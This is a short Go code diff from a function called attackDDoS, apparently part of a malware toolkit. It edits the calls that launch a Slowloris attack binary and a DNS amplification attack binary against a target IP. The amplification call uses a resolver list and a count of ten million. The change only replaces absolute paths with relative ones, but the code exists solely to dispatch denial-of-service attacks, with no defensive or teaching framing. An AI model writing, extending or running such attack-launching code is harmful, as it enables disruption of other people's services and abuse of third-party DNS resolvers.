@@ -71,14 +71,14 @@ func attackDDoS(ip string) {
 	switch x {
 	case 1:
 		fmt.Println("------------------------Starting Slowloris Attack------------------------")
-		out, err := exec.Command("/home/marti/Desktop/mlw/ddos/slowloris", ip).Output()
+		out, err := exec.Command("./slowloris", ip).Output()
 		if err != nil {
 			log.Fatal(err)
 		}
 		fmt.Println(string(out))
 	case 2:
 		fmt.Println("------------------------Starting DNS Amplification Attack------------------------")
-		out, err := exec.Command("/home/marti/Desktop/mlw/ddos/dnsdrdos.o", "-f", "/home/marti/Desktop/mlw/ddos/DNSlist.txt", "-s", strings.Split(ip, ":")[0], "-l", "10000000").Output()
+		out, err := exec.Command("./dnsdrdos.o", "-f", "./DNSlist.txt", "-s", strings.Split(ip, ":")[0], "-l", "10000000").Output()
 		if err != nil {
 			log.Fatal(err)
 		}
